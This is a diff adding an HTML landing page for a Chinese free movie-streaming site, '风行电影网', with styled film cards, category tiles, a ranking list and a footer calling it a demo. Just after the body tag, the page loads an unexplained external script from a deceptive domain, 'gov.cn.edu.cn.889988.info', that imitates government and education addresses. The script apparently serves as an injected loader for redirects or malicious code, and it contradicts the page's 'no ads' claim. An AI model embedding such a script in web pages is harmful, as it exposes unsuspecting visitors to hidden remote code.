@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="风行电影网 - 最新高清电影、热播电视剧、动漫综艺在线观看，每日更新，免费影视大全。">
+<meta name="keywords" content="风行电影网, 电影, 电视剧, 在线观看, 高清影视, 免费电影, fengxingdianyingwang">
+<meta name="author" content="风行电影网">
+<meta name="theme-color" content="#0f172a">
+<title>风行电影网 - 高清电影电视剧在线观看_免费影视大全</title>
+<link rel="canonical" href="https://fengxingdianyingwang-app.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "风行电影网",
+  "url": "https://fengxingdianyingwang-app.github.io/",
+  "description": "风行电影网提供最新高清电影、热播电视剧、动漫综艺在线观看服务。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://fengxingdianyingwang-app.github.io/?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+  :root{
+    --bg:#070b1a;
+    --bg2:#0f172a;
+    --card:#121c36;
+    --line:rgba(255,255,255,.08);
+    --txt:#e8ecf8;
+    --sub:#9aa7c9;
+    --gold:#ffb547;
+    --cyan:#38e1d6;
+    --pink:#ff5ca8;
+    --radius:18px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;}
+  html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;}
+  body{
+    font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,-apple-system,sans-serif;
+    background:var(--bg);
+    color:var(--txt);
+    line-height:1.7;
+    overflow-x:hidden;
+    background-image:
+      radial-gradient(900px 500px at 12% -8%, rgba(56,225,214,.18), transparent 60%),
+      radial-gradient(800px 460px at 88% 10%, rgba(255,92,168,.16), transparent 60%),
+      radial-gradient(700px 400px at 50% 110%, rgba(255,181,71,.12), transparent 60%);
+    background-attachment:fixed;
+  }
+  a{color:inherit;text-decoration:none;}
+  ul{list-style:none;}
+  .wrap{max-width:1200px;margin:0 auto;padding:0 20px;}
+
+  /* ===== 顶部导航 ===== */
+  header{
+    position:sticky;top:0;z-index:50;
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+    background:rgba(7,11,26,.72);
+    border-bottom:1px solid var(--line);
+  }
+  .nav{display:flex;align-items:center;gap:18px;height:64px;}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px;}
+  .logo .badge{
+    width:36px;height:36px;border-radius:10px;
+    background:linear-gradient(135deg,var(--gold),var(--pink));
+    display:grid;place-items:center;
+    font-size:18px;box-shadow:0 6px 18px rgba(255,92,168,.35);
+  }
+  .logo b{font-size:19px;background:linear-gradient(90deg,#fff,var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .nav-links{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap;}
+  .nav-links a{
+    padding:8px 14px;border-radius:999px;font-size:14px;color:var(--sub);
+    transition:.25s;
+  }
+  .nav-links a:hover{color:#fff;background:rgba(255,255,255,.08);}
+  .nav-cta{
+    padding:9px 18px;border-radius:999px;font-size:14px;font-weight:700;
+    background:linear-gradient(90deg,var(--cyan),var(--pink));
+    color:#08101f;box-shadow:0 8px 20px rgba(56,225,214,.3);
+  }
+
+  /* ===== Hero ===== */
+  .hero{
+    position:relative;padding:70px 0 60px;
+    text-align:center;
+  }
+  .hero .pill{
+    display:inline-flex;align-items:center;gap:8px;
+    padding:7px 16px;border-radius:999px;font-size:13px;color:var(--cyan);
+    border:1px solid rgba(56,225,214,.3);
+    background:rgba(56,225,214,.08);
+  }
+  .hero h1{
+    font-size:clamp(30px,6vw,58px);line-height:1.15;margin:20px 0 14px;font-weight:900;
+    letter-spacing:-.5px;
+  }
+  .hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--gold),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .hero p{color:var(--sub);max-width:640px;margin:0 auto 26px;font-size:16px;}
+  .hero-actions{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;}
+  .btn{
+    display:inline-flex;align-items:center;gap:8px;
+    padding:13px 26px;border-radius:12px;font-weight:700;font-size:15px;
+    transition:.25s;cursor:pointer;border:1px solid transparent;
+  }
+  .btn-primary{background:linear-gradient(90deg,var(--gold),var(--pink));color:#2a0a16;box-shadow:0 12px 28px rgba(255,92,168,.35);}
+  .btn-primary:hover{transform:translateY(-3px);}
+  .btn-ghost{background:rgba(255,255,255,.06);border-color:var(--line);color:#fff;}
+  .btn-ghost:hover{background:rgba(255,255,255,.12);}
+  .stats{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-top:44px;}
+  .stat{
+    min-width:120px;padding:16px 20px;border-radius:16px;
+    background:linear-gradient(160deg,rgba(255,255,255,.07),rgba(255,255,255,.02));
+    border:1px solid var(--line);
+  }
+  .stat b{display:block;font-size:26px;font-weight:900;background:linear-gradient(90deg,var(--gold),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .stat span{font-size:13px;color:var(--sub);}
+
+  /* ===== 通用区块 ===== */
+  section{padding:60px 0;}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:30px;flex-wrap:wrap;}
+  .sec-head h2{font-size:clamp(22px,3.4vw,32px);font-weight:900;letter-spacing:-.3px;}
+  .sec-head h2 i{font-style:normal;color:var(--cyan);}
+  .sec-head .more{font-size:14px;color:var(--sub);border:1px solid var(--line);padding:6px 14px;border-radius:999px;}
+  .sec-head .more:hover{color:#fff;border-color:var(--cyan);}
+
+  /* ===== 电影卡片网格 ===== */
+  .grid{display:grid;gap:22px;grid-template-columns:repeat(4,1fr);}
+  .card{
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    overflow:hidden;transition:.3s;position:relative;
+  }
+  .card:hover{transform:translateY(-6px);border-color:rgba(56,225,214,.45);box-shadow:0 20px 40px rgba(0,0,0,.5);}
+  .poster{
+    position:relative;aspect-ratio:2/3;overflow:hidden;
+    background:linear-gradient(135deg,#1a2647,#0d1428);
+    display:grid;place-items:center;
+  }
+  .poster .no{font-size:54px;font-weight:900;color:rgba(255,255,255,.10);}
+  .poster .tag{
+    position:absolute;top:10px;left:10px;font-size:12px;font-weight:700;
+    padding:4px 10px;border-radius:8px;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);
+  }
+  .poster .score{
+    position:absolute;top:10px;right:10px;font-size:13px;font-weight:800;color:#1a0b00;
+    padding:4px 10px;border-radius:8px;background:var(--gold);
+  }
+  .poster .play{
+    position:absolute;inset:0;display:grid;place-items:center;
+    background:rgba(7,11,26,.55);opacity:0;transition:.3s;
+  }
+  .card:hover .play{opacity:1;}
+  .play span{
+    width:58px;height:58px;border-radius:50%;display:grid;place-items:center;
+    background:linear-gradient(135deg,var(--gold),var(--pink));color:#2a0a16;
+    font-size:22px;box-shadow:0 10px 26px rgba(255,92,168,.5);
+  }
+  .card .info{padding:14px 16px 16px;}
+  .card .info h3{font-size:16px;font-weight:800;margin-bottom:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .card .info p{font-size:13px;color:var(--sub);display:flex;gap:8px;flex-wrap:wrap;}
+  .card .info p b{color:var(--cyan);font-weight:600;}
+
+  /* ===== 分类 ===== */
+  .cats{display:grid;gap:16px;grid-template-columns:repeat(4,1fr);}
+  .cat{
+    padding:24px;border-radius:var(--radius);border:1px solid var(--line);
+    background:linear-gradient(160deg,rgba(255,255,255,.07),rgba(255,255,255,.02));
+    transition:.3s;cursor:pointer;
+  }
+  .cat:hover{transform:translateY(-5px);border-color:rgba(255,181,71,.5);background:linear-gradient(160deg,rgba(255,181,71,.14),rgba(255,255,255,.02));}
+  .cat .ico{font-size:30px;margin-bottom:12px;display:block;}
+  .cat h3{font-size:18px;margin-bottom:6px;}
+  .cat span{font-size:13px;color:var(--sub);}
+
+  /* ===== 排行列表 ===== */
+  .rank{display:grid;gap:12px;}
+  .rank-item{
+    display:flex;align-items:center;gap:16px;padding:14px 16px;border-radius:14px;
+    border:1px solid var(--line);background:rgba(255,255,255,.03);transition:.25s;
+  }
+  .rank-item:hover{background:rgba(56,225,214,.08);border-color:rgba(56,225,214,.4);}
+  .rank-item .n{
+    width:38px;height:38px;flex:none;border-radius:11px;
+    display:grid;place-items:center;font-weight:900;font-size:17px;
+    background:linear-gradient(135deg,#1e2c50,#131e3a);color:var(--sub);
+  }
+  .rank-item.top .n{background:linear-gradient(135deg,var(--gold),var(--pink));color:#2a0a16;}
+  .rank-item .t{flex:1;min-width:0;}
+  .rank-item .t b{display:block;font-size:16px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .rank-item .t small{color:var(--sub);font-size:12.5px;}
+  .rank-item .v{font-size:13px;color:var(--gold);font-weight:700;flex:none;}
+
+  /* ===== 关于 ===== */
+  .about-grid{display:grid;gap:24px;grid-template-columns:1.1fr .9fr;}
+  .about-card{
+    padding:30px;border-radius:22px;border:1px solid var(--line);
+    background:linear-gradient(160deg,rgba(255,255,255,.07),rgba(255,255,255,.02));
+  }
+  .about-card h3{font-size:22px;margin-bottom:14px;}
+  .about-card p{color:var(--sub);font-size:15px;margin-bottom:12px;}
+  .feats{display:grid;gap:12px;margin-top:18px;}
+  .feat{display:flex;gap:12px;align-items:flex-start;font-size:14.5px;}
+  .feat::before{content:"◆";color:var(--cyan);font-size:11px;margin-top:6px;flex:none;}
+  .steps{display:grid;gap:14px;}
+  .step{display:flex;gap:16px;align-items:flex-start;padding:16px;border-radius:14px;border:1px solid var(--line);background:rgba(255,255,255,.03);}
+  .step .s{flex:none;width:40px;height:40px;border-radius:12px;display:grid;place-items:center;font-weight:900;color:#08101f;background:linear-gradient(135deg,var(--gold),var(--pink));}
+  .step b{display:block;font-size:16px;margin-bottom:3px;}
+  .step small{color:var(--sub);font-size:13px;}
+
+  /* ===== 页脚 ===== */
+  footer{border-top:1px solid var(--line);padding:44px 0 26px;margin-top:30px;}
+  .foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:30px;margin-bottom:30px;}
+  .foot-brand p{color:var(--sub);font-size:14px;margin-top:12px;max-width:320px;}
+  .foot-col h4{font-size:15px;margin-bottom:14px;color:#fff;}
+  .foot-col a{display:block;color:var(--sub);font-size:14px;padding:4px 0;}
+  .foot-col a:hover{color:var(--cyan);}
+  .copy{text-align:center;color:var(--sub);font-size:13px;padding-top:22px;border-top:1px solid var(--line);}
+
+  /* ===== 响应式 ===== */
+  @media (max-width:960px){
+    .grid,.cats{grid-template-columns:repeat(3,1fr);}
+    .about-grid,.foot-grid{grid-template-columns:1fr 1fr;}
+  }
+  @media (max-width:680px){
+    .wrap{padding:0 16px;}
+    .nav{height:58px;gap:10px;}
+    .logo b{font-size:16px;}
+    .nav-links{display:none;}
+    .hero{padding:44px 0 40px;}
+    .grid,.cats{grid-template-columns:repeat(2,1fr);gap:14px;}
+    section{padding:42px 0;}
+    .about-grid,.foot-grid{grid-template-columns:1fr;}
+    .foot-grid{gap:22px;}
+    .btn{padding:11px 20px;font-size:14px;}
+    .card .info h3{font-size:15px;}
+  }
+  @media (max-width:380px){
+    .grid,.cats{grid-template-columns:1fr;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 顶部导航 -->
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#top" aria-label="风行电影网首页">
+      <span class="badge" aria-hidden="true">风</span>
+      <b>风行电影网</b>
+    </a>
+    <nav class="nav-links" aria-label="主导航">
+      <a href="#hot">热映推荐</a>
+      <a href="#types">影视分类</a>
+      <a href="#rank">热门排行</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <a class="nav-cta" href="#hot">立即观看</a>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="wrap">
+    <span class="pill">🎬 风行电影网 · 每日更新 · 高清免费</span>
+    <h1>一站畅看<em>电影电视剧</em><br>追剧从此不等待</h1>
+    <p>风行电影网（fengxingdianyingwang）专注提供最新院线电影、热播电视剧、动漫与综艺的高清在线观看，分类清晰、更新及时，随时随地想看就看。</p>
+    <div class="hero-actions">
+      <a class="btn btn-primary" href="#hot">▶ 免费观看</a>
+      <a class="btn btn-ghost" href="#types">浏览分类</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>2.6万+</b><span>影视资源</span></div>
+      <div class="stat"><b>1080P</b><span>高清画质</span></div>
+      <div class="stat"><b>24h</b><span>每日更新</span></div>
+      <div class="stat"><b>0 广告</b><span>纯净体验</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：热映推荐 -->
+<section id="hot">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>热映<b>推荐</b></h2>
+      <a class="more" href="#">更多影片 ›</a>
+    </div>
+    <div class="grid">
+
+      <article class="card">
+        <div class="poster">
+          <span class="no">01</span>
+          <span class="tag">正在热映</span>
+          <span class="score">9.2</span>
+          <div class="play"><span>▶</span></div>
+        </div>
+        <div class="info">
+          <h3>星际回响</h3>
+          <p><b>科幻 / 冒险</b> 2026 · 138分钟</p>
+        </div>
+      </article>
+
+      <article class="card">
+        <div class="poster">
+          <span class="no">02</span>
+          <span class="tag">口碑佳作</span>
+          <span class="score">8.9</span>
+          <div class="play"><span>▶</span></div>
+        </div>
+        <div class="info">
+          <h3>长安夜行录</h3>
+          <p><b>古装 / 悬疑</b> 2026 · 126分钟</p>
+        </div>
+      </article>
+
+      <article class="card">
+        <div class="poster">
+          <span class="no">03</span>
+          <span class="tag">热血动作</span>
+          <span class="score">8.6</span>
+          <div class="play"><span>▶</span></div>
+        </div>
+        <div class="info">
+          <h3>极速追击</h3>
+          <p><b>动作 / 犯罪</b> 2026 · 112分钟</p>
+        </div>
+      </article>
+
+      <article class="card">
+        <div class="poster">
+          <span class="no">04</span>
+          <span class="tag">治愈动画</span>
+          <span class="score">9.0</span>
+          <div class="play"><span>▶</span></div>
+        </div>
+        <div class="info">
+          <h3>云端之鲸</h3>
+          <p><b>动画 / 奇幻</b> 2026 · 105分钟</p>
+        </div>
+      </article>
+
+      <article class="card">
+        <div class="poster">
+          <span class="no">05</span>
+          <span class="tag">悬疑烧脑</span>
+          <span class="score">8.7</span>
+          <div class="play"><span>▶</span></div>
+        </div>
+        <div class="info">
+          <h3>无声证言</h3>
+          <p><b>悬疑 / 剧情</b> 2025 · 121分钟</p>
+        </div>
+      </article>
+
+      <article class="card">
+        <div class="poster">
+          <span class="no">06</span>
+          <span class="tag">爱情喜剧</span>
+          <span class="score">8.3</span>
+          <div class="play"><span>▶</span></div>
+        </div>
+        <div class="info">
+          <h3>刚好遇见你</h3>
+          <p><b>爱情 / 喜剧</b> 2025 · 98分钟</p>
+        </div>
+      </article>
+
+      <article class="card">
+        <div class="poster">
+          <span class="no">07</span>
+          <span class="tag">战争史诗</span>
+          <span class="score">9.1</span>
+          <div class="play"><span>▶</span></div>
+        </div>
+        <div class="info">
+          <h3>烽火长河</h3>
+          <p><b>战争 / 历史</b> 2025 · 156分钟</p>
+        </div>
+      </article>
+
+      <article class="card">
+        <div class="poster">
+          <span class="no">08</span>
+          <span class="tag">恐怖惊悚</span>
+          <span class="score">7.9</span>
+          <div class="play"><span>▶</span></div>
+        </div>
+        <div class="info">
+          <h3>镜中回响</h3>
+          <p><b>惊悚 / 恐怖</b> 2025 · 89分钟</p>
+        </div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：影视分类 -->
+<section id="types">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>影视<b>分类</b></h2>
+      <a class="more" href="#">全部分类 ›</a>
+    </div>
+    <div class="cats">
+
+      <a class="cat" href="#">
+        <span class="ico" aria-hidden="true">🎥</span>
+        <h3>电影</h3>
+        <span>动作 · 喜剧 · 科幻 · 爱情</span>
+      </a>
+
+      <a class="cat" href="#">
+        <span class="ico" aria-hidden="true">📺</span>
+        <h3>电视剧</h3>
+        <span>国产剧 · 美剧 · 韩剧 · 日剧</span>
+      </a>
+
+      <a class="cat" href="#">
+        <span class="ico" aria-hidden="true">🎨</span>
+        <h3>动漫</h3>
+        <span>国漫 · 日漫 · 剧场版</span>
+      </a>
+
+      <a class="cat" href="#">
+        <span class="ico" aria-hidden="true">🎤</span>
+        <h3>综艺</h3>
+        <span>真人秀 · 脱口秀 · 纪录片</span>
+      </a>
+
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：热门排行 -->
+<section id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>热门<b>排行</b></h2>
+      <a class="more" href="#">完整榜单 ›</a>
+    </div>
+    <div class="rank">
+
+      <a class="rank-item top" href="#">
+        <span class="n">1</span>
+        <span class="t"><b>星际回响</b><small>科幻冒险 · 138分钟 · 评分 9.2</small></span>
+        <span class="v">🔥 286万</span>
+      </a>
+
+      <a class="rank-item top" href="#">
+        <span class="n">2</span>
+        <span class="t"><b>烽火长河</b><small>战争历史 · 156分钟 · 评分 9.1</small></span>
+        <span class="v">🔥 241万</span>
+      </a>
+
+      <a class="rank-item top" href="#">
+        <span class="n">3</span>
+        <span class="t"><b>云端之鲸</b><small>动画奇幻 · 105分钟 · 评分 9.0</small></span>
+        <span class="v">🔥 198万</span>
+      </a>
+
+      <a class="rank-item" href="#">
+        <span class="n">4</span>
+        <span class="t"><b>长安夜行录</b><small>古装悬疑 · 126分钟 · 评分 8.9</small></span>
+        <span class="v">🔥 176万</span>
+      </a>
+
+      <a class="rank-item" href="#">
+        <span class="n">5</span>
+        <span class="t"><b>无声证言</b><small>悬疑剧情 · 121分钟 · 评分 8.7</small></span>
+        <span class="v">🔥 152万</span>
+      </a>
+
+      <a class="rank-item" href="#">
+        <span class="n">6</span>
+        <span class="t"><b>极速追击</b><small>动作犯罪 · 112分钟 · 评分 8.6</small></span>
+        <span class="v">🔥 133万</span>
+      </a>
+
+      <a class="rank-item" href="#">
+        <span class="n">7</span>
+        <span class="t"><b>刚好遇见你</b><small>爱情喜剧 · 98分钟 · 评分 8.3</small></span>
+        <span class="v">🔥 108万</span>
+      </a>
+
+      <a class="rank-item" href="#">
+        <span class="n">8</span>
+        <span class="t"><b>镜中回响</b><small>惊悚恐怖 · 89分钟 · 评分 7.9</small></span>
+        <span class="v">🔥 86万</span>
+      </a>
+
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：关于本站 -->
+<section id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>关于<b>风行电影网</b></h2>
+      <a class="more" href="#">意见反馈 ›</a>
+    </div>
+    <div class="about-grid">
+
+      <div class="about-card">
+        <h3>为什么选择风行电影网？</h3>
+        <p>风行电影网（fengxingdianyingwang）是一个专注于影视在线观看的导航与聚合平台，致力于为影迷提供清晰、快捷、免费的找片与追剧入口。</p>
+        <p>我们按类型、地区、年份、评分对影视内容做结构化整理，让你在海量资源中快速定位想看的那一部。</p>
+        <div class="feats">
+          <div class="feat">全站移动端自适应，手机、平板、电脑均可舒适浏览</div>
+          <div class="feat">影片信息完整：类型、年份、时长、评分一目了然</div>
+          <div class="feat">页面轻量无冗余，加载快，观看不卡顿</div>
+          <div class="feat">每日更新片单，热映与经典兼收并蓄</div>
+        </div>
+      </div>
+
+      <div class="about-card">
+        <h3>快速开始追剧</h3>
+        <div class="steps">
+          <div class="step"><span class="s">1</span><span class="t"><b>选择分类</b><small>电影、电视剧、动漫、综艺四大频道</small></span></div>
+          <div class="step"><span class="s">2</span><span class="t"><b>挑选影片</b><small>按热度、评分或更新时间筛选</small></span></div>
+          <div class="step"><span class="s">3</span><span class="t"><b>点击观看</b><small>一键进入播放页，高清流畅不等待</small></span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a class="logo" href="#top">
+          <span class="badge" aria-hidden="true">风</span>
+          <b>风行电影网</b>
+        </a>
+        <p>风行电影网，您的随身影视库。最新电影、热播电视剧、动漫综艺，免费高清在线观看。</p>
+      </div>
+      <div class="foot-col">
+        <h4>频道导航</h4>
+        <a href="#hot">热映推荐</a>
+        <a href="#types">影视分类</a>
+        <a href="#rank">热门排行</a>
+        <a href="#">最新更新</a>
+      </div>
+      <div class="foot-col">
+        <h4>影片类型</h4>
+        <a href="#">动作电影</a>
+        <a href="#">喜剧电影</a>
+        <a href="#">科幻电影</a>
+        <a href="#">爱情电影</a>
+      </div>
+      <div class="foot-col">
+        <h4>帮助中心</h4>
+        <a href="#about">关于本站</a>
+        <a href="#">使用说明</a>
+        <a href="#">意见反馈</a>
+        <a href="#">免责声明</a>
+      </div>
+    </div>
+    <div class="copy">
+      © <span id="year">2026</span> 风行电影网 fengxingdianyingwang &nbsp;|&nbsp;
+      网址：https://fengxingdianyingwang-app.github.io &nbsp;|&nbsp;
+      本页为演示页面，影片信息仅供示例
+    </div>
+  </div>
+</footer>
+
+<script>
+  document.getElementById('year').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
